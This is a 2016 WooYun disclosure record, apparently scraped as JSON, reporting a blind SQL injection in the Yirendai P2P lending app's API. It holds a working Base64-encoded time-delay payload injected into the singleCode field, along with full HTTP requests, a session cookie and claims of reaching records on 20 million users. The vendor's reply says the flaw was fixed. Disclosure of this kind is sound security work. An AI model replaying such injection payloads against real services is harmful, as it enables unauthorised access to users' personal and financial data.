{"id": 86474, "wybug_id": "wooyun-2016-0187007", "wybug_title": "P2P安全之宜人贷官方APP存在SQL注入（含2000W+用户数据/40W+交易订单）", "wybug_corp": "宜人贷", "wybug_author": "路人甲", "wybug_date": "2016-03-20 16:31", "wybug_open_date": "2016-05-04 16:41", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-03-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-04：\t细节向公众公开  简要描述： APP安全之SQL注入 详细说明：  目标：宜人贷IOS APP检测发现以下地方存在SQL注入：(POST中的singleCode，BASE64编码，时间盲注)\nPOST http://app.normal.yirendai.com/user/appUpdate HTTP/1.1Host: app.normal.yirendai.comProxy-Connection: closeContent-Type: application/x-www-form-urlencoded; charset=utf-8User-Agent: 宜人贷借款 3.4.0 rv:549 (iPhone; iPhone OS 9.2.1; zh_CN)Content-Length: 315Accept-Encoding: gzipConnection: closesystem=eyJhcHBWZXJzaW9uTmFtZSI6IjMuNC4wIiwic2luZ2xlQ29kZSI6IjU2NDQ0M0NDLTkxODktNDJDMS05Q0M5LTA5MjIxMTZBRDVDNCIsImxhdCI6IiIsImFwcFZlcnNpb25Db2RlIjoiNTQ5IiwiaXNFbXVsYXRvciI6IjAiLCJzeXN0ZW1QaG9uZSI6ImlvcyIsInN5c3RlbVZlcnNpb24iOiI5LjIwMDAwMCIsInRkQ2hhbm5lbElEIjoiYXBwU3RvcmUiLCJzeXN0ZW1Nb2RlbCI6ImlQaG9uZSIsImxuZyI6IiJ9\nPayload:（延时）\nPOST http://app.normal.yirendai.com/user/appUpdate HTTP/1.1Content-Length: 383Accept-Language: en-us,en;q=0.5Accept-Encoding: gzipHost: app.normal.yirendai.comAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: ˴     3.4.0 rv:549 (iPhone; iPhone OS 9.2.1; zh_CN)Accept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7Cookie: JSESSIONID=3C9A6D149C83DB1766AB156C0B0CC845.yrdasnew-01Pragma: no-cacheCache-Control: no-cache,no-storeContent-Type: application/x-www-form-urlencoded; charset=utf-8system=eyJhcHBWZXJzaW9uTmFtZSI6IjMuNC4wIiwic2luZ2xlQ29kZSI6IjU2NDQ0M0NDLTkxODktNDJDMS05Q0M5LTA5MjIxMTZBRDVDNCcgWE9SKGlmKDE9MSxiZW5jaG1hcmsoMTAwMDAwMDAsbWQ1KDExMSkpLDApKWFuZCciLCJsYXQiOiIiLCJhcHBWZXJzaW9uQ29kZSI6IjU0OSIsImlzRW11bGF0b3IiOiIwIiwic3lzdGVtUGhvbmUiOiJpb3MiLCJzeXN0ZW1WZXJzaW9uIjoiOS4yMDAwMDAiLCJ0ZENoYW5uZWxJRCI6ImFwcFN0b3JlIiwic3lzdGVtTW9kZWwiOiJpUGhvbmUiLCJsbmciOiIifQ==\n   漏洞证明：  1、当前数据库用户\n\n2、所有数据库\n\n3、用户表，订单表，含2000W+用户数据/40W+交易订单，具体就不深入了\n\n\n\n   修复方案：  请多指教~   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-03-20 16:41 厂商回复： 感谢白帽子发现的问题，正在处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-20 19:25 |    \t\tyirendai(乌云厂商)\t\t \n  紧急进行排查，确认此处逻辑为查询后写入数据，并不会将查询结果直接返回，所以白帽子描述的盲注类型准确。漏洞已经在2小时内修复。同时未发现大批量的盲注查询请求，未发生用户数据泄露。再次感谢白帽子的反馈。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}